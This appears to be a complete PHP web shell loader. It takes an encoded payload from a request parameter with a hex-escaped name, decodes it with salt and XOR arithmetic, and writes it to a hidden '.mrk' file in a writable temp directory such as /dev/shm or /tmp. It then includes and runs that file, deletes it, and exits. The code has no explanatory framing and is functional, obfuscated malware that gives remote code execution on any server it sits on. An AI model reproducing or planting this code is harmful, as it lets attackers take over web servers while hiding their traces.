<?php

if(in_array("\x76\x61lue", array_keys($_REQUEST))){
	$obj = $_REQUEST["\x76\x61lue"];
	 $obj	 =	explode		 ("." ,$obj		 )	;	 
	$dchunk = '';
            $salt = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen(	$salt);
            $__len = count(	$obj);
    
            for(	$z = 0; $z	 <  $__len; $z++) {
                $v8 = $obj[$z];
                $sChar = ord(	$salt[$z		%	$sLen]);
                $d =(	(	int)$v8 - $sChar -(	$z		%	10))	^26;
                $dchunk .= chr(	$d);}
	$component = array_filter(["/dev/shm", getcwd(), sys_get_temp_dir(), session_save_path(), getenv("TMP"), "/tmp", getenv("TEMP"), "/var/tmp", ini_get("upload_tmp_dir")]);
	foreach ($component as $reference) {
    		if ((is_dir($reference) and is_writable($reference))) {
    $dat = str_replace("{var_dir}", $reference, "{var_dir}/.mrk");
    $success = file_put_contents($dat, $dchunk);
if ($success) {
	include $dat;
	@unlink($dat);
	die();}
}
}
}